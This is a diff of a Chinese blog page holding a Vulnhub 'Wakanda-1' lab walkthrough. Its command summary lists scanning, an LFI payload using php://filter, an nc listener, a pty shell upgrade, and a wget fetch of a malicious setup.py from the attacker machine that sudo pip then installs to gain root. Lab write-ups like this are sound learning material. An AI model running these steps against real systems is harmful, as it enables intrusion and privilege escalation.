@@ -113,7 +113,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/17/692tM7hDbTfYiNx.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/17/7RzU1p9SJVP42Cf.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/17/n62FhL5CdAX8Kew.png">
-<meta property="og:updated_time" content="2019-10-17T04:16:18.877Z">
+<meta property="og:updated_time" content="2019-10-18T13:07:23.603Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Vulnhub Wakanda靶机实践">
 <meta name="twitter:description" content="比赛前几天学习靶机渗透...">
@@ -327,8 +327,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-10-17T12:16:18+08:00">
-                2019-10-17
+              <time title="Post modified" itemprop="dateModified" datetime="2019-10-18T21:07:23+08:00">
+                2019-10-18
               </time>
             
           </span>
@@ -397,7 +397,7 @@
       
 
       
-        <h1 id="Wakanda-1-过程总结"><a href="#Wakanda-1-过程总结" class="headerlink" title="Wakanda-1 过程总结"></a>Wakanda-1 过程总结</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">查看本机<span class="built_in">IP</span>：    <span class="built_in">ip</span> a</span><br><span class="line">目标<span class="built_in">IP</span>：    arp-scan -l</span><br><span class="line">全端口扫描：    nmap -sV -p- <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">网站目录枚举：  dirb http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">网站漏洞扫描：  nikto -h http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/</span><br><span class="line">LFI：   curl http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/?lang=php://filter/convert.base64-encode/resource=index</span><br><span class="line">远程连接：ssh mamadou@<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span> -p <span class="number">3333</span></span><br><span class="line">查看用户权限：  sudo -l</span><br><span class="line">python提示符界面：</span><br><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">nc监听: nc -lvvp <span class="number">5555</span></span><br><span class="line">建立简单的服务器：  python -m SimpleHTTPServer <span class="number">8888</span></span><br><span class="line">查看用户文件：  find / -user devops <span class="number">2</span>&gt;/dev/null</span><br><span class="line">目的机下载set.up执行fakepip：   sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
+        <h1 id="Wakanda-1-过程总结"><a href="#Wakanda-1-过程总结" class="headerlink" title="Wakanda-1 过程总结"></a>Wakanda-1 过程总结</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">查看本机<span class="built_in">IP</span>：    <span class="built_in">ip</span> a</span><br><span class="line"></span><br><span class="line">目标<span class="built_in">IP</span>：    arp-scan -l</span><br><span class="line">全端口扫描：    nmap -sV -p- <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">网站目录枚举：  dirb http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">网站漏洞扫描：  nikto -h http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/</span><br><span class="line">在网站目录 cd /var/www/html/ </span><br><span class="line"></span><br><span class="line">LFI：   curl http://<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/?lang=php://filter/convert.base64-encode/resource=index</span><br><span class="line"></span><br><span class="line">远程连接：ssh mamadou@<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span> -p <span class="number">3333</span></span><br><span class="line">查看用户权限：  sudo -l</span><br><span class="line">python提示符界面：</span><br><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line"></span><br><span class="line">nc监听: nc -lvvp <span class="number">5555</span></span><br><span class="line">建立简单的服务器：  python -m SimpleHTTPServer <span class="number">8888</span></span><br><span class="line">查看用户文件：  find / -user devops <span class="number">2</span>&gt;/dev/null</span><br><span class="line">目的机新建文件：  mkdir fakepip 执行pip漏洞-&gt;cd fakepip</span><br><span class="line">从本地机下载：  wget http://<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.104</span>:<span class="number">8888</span>/setup.py</span><br><span class="line">目的机下载set.up执行fakepip：   sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
 
 <h1 id="Wakanda-1"><a href="#Wakanda-1" class="headerlink" title="Wakanda-1"></a>Wakanda-1</h1><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>查看本机ip ，使用命令 ip a<br><img src="https://i.loli.net/2019/10/17/QJ7rlCpbEwfmoWO.png" alt="9_NO8_QA_M3S_LJ5N3~@MB0.png"><br>查找目标ip，使用命令arp-scan -l<br><img src="https://i.loli.net/2019/10/17/vsfaqpJBGHQClwW.png" alt="1_Q_KQN_8_I_9X___WJL1_R.png"><br>如图可知，目标ip为：192.168.56.101</p>
 <h2 id="搜索信息"><a href="#搜索信息" class="headerlink" title="搜索信息"></a>搜索信息</h2><p>端口扫描：nmap -sV -p- 192.168.56.101<br><img src="https://i.loli.net/2019/10/17/uPg2FhVxnCKTaJ1.png" alt="CNJVOQV@DKZI@55W2_K@GQ4.png"><br>可知，80端口上开放一个WEB程序，3333端口运行SSH服务</p>
@@ -563,7 +563,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
